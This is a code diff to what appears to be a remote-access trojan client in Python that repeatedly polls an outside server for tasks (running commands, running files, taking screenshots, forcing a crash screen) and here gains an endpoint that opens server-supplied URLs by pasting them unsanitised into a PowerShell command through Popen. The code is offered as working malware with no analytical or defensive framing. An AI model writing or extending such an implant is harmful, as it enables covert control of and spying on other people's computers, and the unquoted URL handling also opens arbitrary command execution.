@@ -1,9 +1,9 @@
 from subprocess import CREATE_NEW_CONSOLE, Popen
 from PIL import UnidentifiedImageError, Image
 from requests import Response, post, get
-from base64 import b64decode, b64encode
 from os import environ, getcwd, chdir
 from pyautogui import screenshot
+from base64 import b64decode
 from time import sleep
 from os import remove
 
@@ -20,6 +20,7 @@ def main() -> None:
         get_bsod_response = get(f"{SCHEME}://{IP}:{PORT}/bsod-center")
         get_run_file_response = get(f"{SCHEME}://{IP}:{PORT}/runfile-center")
         get_screenshot_file_response = get(f"{SCHEME}://{IP}:{PORT}/screenshot-center")
+        get_website_response = get(f"{SCHEME}://{IP}:{PORT}/website-center")
         if get_commands_response.status_code == 200:
             run_command(get_commands_response)
         if get_images_response.status_code == 200:
@@ -30,7 +31,13 @@ def main() -> None:
             run_file(get_run_file_response.json())
         if get_screenshot_file_response.status_code == 200:
             take_screenshot()
+        if get_website_response.status_code == 200:
+            open_website(get_website_response.text)
         sleep(DELAY)
+
+
+def open_website(url: str) -> None:
+    Popen(f'powershell -Command "start {url}"')
 
 
 def take_screenshot() -> None:
